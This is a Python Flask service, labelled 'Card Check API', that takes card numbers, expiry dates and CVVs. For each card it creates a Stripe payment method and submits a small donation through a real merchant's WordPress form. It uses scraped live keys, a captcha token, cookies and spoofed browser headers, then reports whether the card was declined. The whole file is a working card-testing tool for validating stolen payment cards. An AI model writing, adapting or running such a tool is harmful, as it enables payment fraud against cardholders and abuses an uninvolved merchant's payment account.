from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def parse_card_data(card_string):
    """Parse card data from CC|MM|YYYY|CVV or CC|MM|YY|CVV format"""
    try:
        parts = card_string.split('|')
        
        if len(parts) != 4:
            return None, "Invalid format. Use: CC|MM|YY|CVV or CC|MM|YYYY|CVV"
        
        card_number = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Handle year format (YY or YYYY)
        if len(exp_year) == 2:
            exp_year = '20' + exp_year  # Convert YY to YYYY
        elif len(exp_year) != 4:
            return None, "Invalid year format"
        
        # Basic validation
        if not card_number.isdigit() or len(card_number) < 15:
            return None, "Invalid card number"
        
        if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
            return None, "Invalid expiration month"
            
        if not exp_year.isdigit() or len(exp_year) != 4:
            return None, "Invalid expiration year"
            
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return None, "Invalid CVV"
        
        return {
            'number': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvv': cvv
        }, None
        
    except Exception as e:
        return None, f"Error parsing card data: {str(e)}"

def process_payment(card_data):
    """Process payment with Stripe and website"""
    # Step 1: Create payment method with Stripe
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
    }

    data = {
        'type': 'card',
        'card[number]': card_data['number'],
        'card[cvc]': card_data['cvv'],
        'card[exp_month]': card_data['month'],
        'card[exp_year]': card_data['year'],
        'guid': 'a466ca92-0874-417f-9cc9-c789c9e3a551ea1379',
        'muid': '6d5f50b7-b6a8-45d8-83dd-589bc91cb559891636',
        'sid': '93b57906-75d2-4f07-85d1-b408dd98eeb865b810',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; card-element',
        'referrer': 'https://allcoughedup.com',
        'time_on_page': '105845',
        'client_attribution_metadata[client_session_id]': 'b82f6ac7-4feb-44d3-a672-f162361237dc',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY0NDMwOTE0LCJjZGF0YSI6IlljTXI3cSsyUzFrWHZRL1h0NW5DanAxektVVXRLdkRsZzRla3Vrb0t0c0pPVWJnUlZZQU5PR1hmMjRsZlNab2dsbnhuODdxVlg1VWpnT003VC9TVkMzdHlRazZOU3MzaUJlMGFZVVRSSHU2eVltc1djK2lNb29oNzI2ZzhZRzBRSDViSVhyblRneFlrWUp1WWpKY0orYXNqdlV2QUE3ZWU1TUZHVU5Ib05GZkdCUCtRQmRBSGNFK2xQcXk2OUNTYmNBV1pvRkdnQ3g1NU9PU0siLCJwYXNza2V5IjoicS9ORXRibXQyVXJ3WVh2Mkt1UnliRGRtMXd2dlRLaEZXL0xuelFaeUEzdnplVEJRWkZuMXJxc2trYURDbHpEQ2ZlTURxMUw2YlVWUnQvWmsvcm9mck9HMlk5RkROaDhJQ2FNT2ROd0swVnJyR04yQitzMWgydDJ5c0xvQlZsNlUzSGJ1OFlXNUJ1TmR2bG5mNEVDbnJVYWh2YndvQmIzaUJiUDNzZDF5OTVjOGZJN2cvdklTcTVRL1UxcGI1OXFBK1RJQkZZZWEvNWhMQmVYc3NpVy9yakFZTDZYdlFoelpVdFFjQ3BGRWFGSi9OWjlVZUZUbkw5YjlnTFg3dTZQMlZTTW1hdThZb2RYSzVZdjF0QzZlZlo2TmY2UkY2QUlNLy9uaTcySnZVT01hRVNhZ2pGa2JFL1NqbHVMeGcvZnRKb29CVHJ5L0xvaEV1a2NFQnF1N1BzUVVLYWQ5amkwNkQ2ODZJcHlwRXBmckFmcXYvb0xHZUZjYzdpV1YrZndvWXVNcEU3UzRURzJiS0t0MTZzR1luWjFHd1VmOE9icHVJcGxKR3hUMzVhWEx0RFF4RktNQ0DESmtheUhDU085eUoyNHptV0V0amtWblVicWNTM2llSU5Xa1NuV0ZwMU41dGhsQmV3d2I3SDR0bHdNalZDdG82cGlzRmNRd3BkRC9hb0UwdHJHcjFGUDhIZ1RuTWdIVTY4MWw0MUFiVkM3VWxmdFlVN0tYMVRpd2FReCtXeHpvZVlwMnFENnJuMklOOTlXRWxSb0hzU0tKdnozNVJyMG9tc29QdldNMFBPbWRvanB5OThNQUFzdHQ1WGplYkJuWGYyWS9qWitDMHk3Y3FKcU4vRDc4Wm55UVFMQjR3Q1lDZHJFTHJMdUtDeVJmUGZXbWVCeUxodGtYMzc0VzZsVTkxSEwwdTdiSUlrUzhLREl2SnhiNCtxSlRPKyt5N2krRGpFWU5ab0U3WStxUkloTi9KZ3JmRlYyYzVPL1pDQlgrNVFMbW1MSFRQOG5sV0hGZzRLWVBYL1ZGQ1RZYm11Wk1nRHI3bHZFbHhVL0RjU0JVTkdoMFZ1dFJCbVNGZWFCWUQrektkQW4rYW5nb2U1Z08vYzJXRVpwTitmUUpGeW5wQjFRMW5JNHlqcDRBOEZnamg5WDI3TnFCbnNKSStITEN2R2N2cG9wM3hSQVZ4UEt3Rk5oNHo2VjdhWTltTDZUcHZUdmJQb1g3aHk2Y1k2amh0Wm8xNy85YVJHSFUyQ1RXYmxuUUt0U2NYRWZzeWd1dGJoYTF1SUM5VWdRN2F5YlJSZ2p0S2VVNUQvT1JxL085Vk5HcU9EMnpBenEzZEZSTjkzQ0pseGJpejNhZ3RZS0srWi9LWXdtYjM3VEQ5QTI0TUFmbGpqcTluSjVLMjUvMHc1YUQzUW5rcHc1MjB5SzlPYjVuM3k1MEhpTnBkRGVtd3NjUUI3c2pQM0ljZzhNZjRxaERXUFBSaE96SllaTWZZbTdJZll2WEVPNzhRdXdPK2t3VlNwUXZVbEpmaUxpWllISk1LdXphWkV3c2VPazZ5YU9NRTdrZS9BYVI0R3BCVUNyTWU2Wjh2V2J6SnBFL1lyclNKeHg0V25ibmV2SkhOUElzbjlSRzhjM09LaitvUDlrOUpmcTBNek5FaWFzYWxCbklWYnlGOUhOMEQ2bkg0TUpROG9mR1Z0ZzVxYVV3TjgvR1NPSFc1WWVTOVJLcy9rTmxpbjhDdmtFaGRERDRld255N1dLeXhNSVlKZ1FxUzY0aVpsbHJtNVdKRTZrSFVtcHZ4S1I4MWtaWkh0QldjZzc2aDRtR0dEY2k0bVk0OXRXTGQ3T2l3K1A1UjNhVElhM2FENHUyc1dHWDZmUDA0Z3hpTlJ5b0JwcXJNanJySmxJM3BFSXNLTXhpOXV1SVB2UXhzcUZ5bE1jQzZIY0d0ZVRJaWsvL1lUZFY1U0djWUhOdmZuOGFOMisyNE1vZ2ltc256d1hsZFJMc0VWZy9pTDZvRVI3WXNNeVFNcnBRd3VSRHRyVE02SHhjT2MxZlczYmRoTHpOUytMSW4zSVhhYlYxN0RUV2VPNFV4bzdYa1Z6LzVlcmtTSUpoQ2lGTHpNMEZTUVV3RlVRQ3ZETm0wS2tiZUFkRmRDUmdtbURkRVdaNlBQZCsrVmpjdVFVU0lJQmhuUlBiaG85cm8xekwxYk52Qm02M2Y4U1JpYjdEdm5uVU15Vzl1c3k1b09PYlh6bms1U1dxWkw3ejlhbEhTTjFNSW93ZllxQjBXVWpyT1oxYTQrTUZFV3laZVA2VjlGWSt4eUJMRU5xTUdzT2NkNEd1WmNQQ3oxckN1WjlFcGNYeWlZdWVJeFRjc2tYUGJ6ZzRBaWQxanNMN2tiZExoQmhCRXRVVFVldWRneURoUzJySVVkVXY2aU1RaG1maVZtVmFBYVV1YkF6WCtwMytWek5wNEVRTzRSL1cvNFpJcmRUTDYzdlloRGptMEtPNWxSb2ZiQlBreGIrMUYyVXFFSVllREFRQTFEYmtMb2FJZUV0bE9SQzUrMG5hZElkK1grWDV3MUhkSkVsS0gwb21rYWt5d1BLZUZMZGJtTFJnbjhIYWxBQXJRMkMyVFlLUVlrMjdpQT09Iiwia3IiOiIyMDJlYmQ4YiIsInNoYXJkX2lkIjoyNTkxODkzNTl9.a7ufKLRaZuRuVLvmic9xhhpRaUOgCfW1qGW96J4DMVA'
    }

    try:
        # Convert dict to form data
        form_data = ""
        for key, value in data.items():
            form_data += f"{key}={value}&"
        form_data = form_data.rstrip('&')

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=form_data)
        stripe_response = response.json()
        
        if 'id' in stripe_response:
            payment_method_id = stripe_response['id']
            
            # Step 2: Submit payment to website
            cookies = {
                '__stripe_mid': '6d5f50b7-b6a8-45d8-83dd-589bc91cb559891636',
                '__stripe_sid': '93b57906-75d2-4f07-85d1-b408dd98eeb865b810',
            }

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://allcoughedup.com',
                'priority': 'u=1, i',
                'referer': 'https://allcoughedup.com/registry/',
                'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {'t': '1764430896820'}

            data = {
                'data': f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=46a22d3330&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=assassin&email=rambook554%40gmail.com&custom-payment-amount=5&description=&payment_method=stripe&__stripe_payment_method_id={payment_method_id}',
                'action': 'fluentform_submit',
                'form_id': '4',
            }

            response = requests.post(
                'https://allcoughedup.com/wp-admin/admin-ajax.php',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )

            website_response = response.text
            
            # Check if card was declined
            if "card was declined" in website_response:
                return {
                    "status": "declined",
                    "message": "Stripe Error: Your card was declined.",
                    "append_data": {
                        "__entry_intermediate_hash": "b3953f102a541468154c6f557a1c016"
                    }
                }
            else:
                return {
                    "status": "success", 
                    "message": "Payment processed successfully",
                    "response": website_response
                }

        else:
            # If payment method creation failed
            error_msg = stripe_response.get('error', {}).get('message', 'Unknown Stripe error')
            return {
                "status": "error",
                "message": f"Stripe Error: {error_msg}",
                "append_data": {
                    "__entry_intermediate_hash": "b3953f102a541468154c6f557a1c016"
                }
            }

    except Exception as e:
        return {
            "status": "error",
            "message": f"Request Error: {str(e)}",
            "append_data": {
                "__entry_intermediate_hash": "b3953f102a541468154c6f557a1c016"
            }
        }

@app.route('/')
def home():
    return jsonify({
        "message": "Card Check API Running",
        "usage": "Use /check/CC|MM|YY|CVV or /check/CC|MM|YYYY|CVV"
    })

@app.route('/check/<path:card_data>')
def check_card(card_data):
    """API endpoint to check card data"""
    # Remove any leading/trailing slashes
    card_data = card_data.strip('/')
    
    # Parse card data
    card_info, error = parse_card_data(card_data)
    
    if error:
        return jsonify({
            "status": "error",
            "message": error
        })
    
    # Process payment
    result = process_payment(card_info)
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
